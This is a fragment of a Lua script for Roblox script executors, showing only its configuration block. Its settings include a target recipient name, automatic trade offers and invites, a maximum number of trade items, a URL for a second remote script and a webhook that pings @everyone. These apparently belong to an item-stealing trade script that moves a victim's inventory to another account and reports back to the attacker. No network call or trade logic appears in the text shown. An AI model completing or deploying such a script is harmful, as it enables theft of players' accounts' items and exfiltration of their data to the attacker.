...
if typeof(getgenv) == "function" then
    PUBLIC_CONFIG = getgenv().MoreiraPublicConfig or {}
else
    PUBLIC_CONFIG = _G.MoreiraPublicConfig or {}
end

local CONFIG = {
    ANONYMOUS = PUBLIC_CONFIG.ANONYMOUS == true,
    TARGET_NAME = PUBLIC_CONFIG.TARGET_NAME or "USER",
    SECOND_SCRIPT_URL = PUBLIC_CONFIG.SECOND_SCRIPT_URL or "",
    WEBHOOK = PUBLIC_CONFIG.WEBHOOK or {
        URL = "",
        PING = "@everyone",
        NOTIFY_WHEN_EMPTY = true,
    },
    EXCLUDE_ITEMS = PUBLIC_CONFIG.EXCLUDE_ITEMS or {},
    INCLUDE_EMOTES = PUBLIC_CONFIG.INCLUDE_EMOTES ~= false,

    MAX_TRADE_ITEMS = PRIVATE_CONFIG.MAX_TRADE_ITEMS,
    OFFER_GAP = PRIVATE_CONFIG.OFFER_GAP,
    READY_TIMEOUT = PRIVATE_CONFIG.READY_TIMEOUT,
    AUTO_INVITE = PRIVATE_CONFIG.AUTO_INVITE,
    INVITE_EVERY = PRIVATE_CONFIG.INVITE_EVERY,
}
